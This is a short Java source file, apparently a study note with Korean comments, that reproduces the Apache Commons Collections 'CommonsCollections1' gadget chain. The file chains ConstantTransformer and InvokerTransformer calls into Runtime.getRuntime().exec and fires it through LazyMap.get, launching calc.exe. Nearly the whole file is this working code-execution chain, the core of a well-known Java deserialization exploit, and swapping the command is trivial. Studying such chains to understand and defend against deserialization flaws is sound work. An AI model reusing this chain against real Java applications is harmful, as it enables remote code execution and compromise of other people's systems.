import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

/**
 * @author	Jae-Woong Moon(mjw8585@gmail.com)
 * @brief	http://redscreen.tistory.com/category/%3A%3A%20%20%EC%B7%A8%EC%95%BD%EC%A0%90
 * @Date	2018. 6. 25.	 
 */
public class CommonCollections1PayloadOnly {

	public static void main(String[] args) {
		String[] command = {"calc.exe"};
		
		// Transformer 들의 순서가 중요하다. 순서가 바뀌면 계산기가 실행되지 않는다.
		/* 해설: 
		 *  - transformer 함수는 메서드의 반환값을 다음 실행되는 transformer 의 인자로 넘긴다.
		 *  - 
		 * 
		 * */
		// InvokerTransformer 는 invoke 메서드를 이용한 결과를 객체로 반환한다.
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", 
					new Class[] {String.class, Class[].class},
					new Object[] {"getRuntime", new Class[0]}
			),
			new InvokerTransformer("invoke", 
					new Class[] {Object.class, Object[].class},
					new Object[] {null, new Object[0]}
			),
			new InvokerTransformer("exec", 
					new Class[] {String.class}, 
					command)
		};
		
		
		
		ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
		Map map = new HashMap<>();
		
		/* decprate : Map 객체를 decorator 패턴으로 확장해주는 메서드
		 * - get 호출시 Map 안에 key 값과 매칭되는 value값이 없으면 ChainedTransformer(factory) 가 해당 인자를 이용하여
		 * 새로운 객체를 생성한다.
		 * - 이 때 ChainedTransformer 안에 있는 Transformer 들이 가지고 있는 값들(Runtime.class, getMethod, invoke 등)을 이용한다.
		 */
		Map lazyMap = LazyMap.decorate(map, chainedTransformer); 
		lazyMap.get("gursev");
		
	}
}
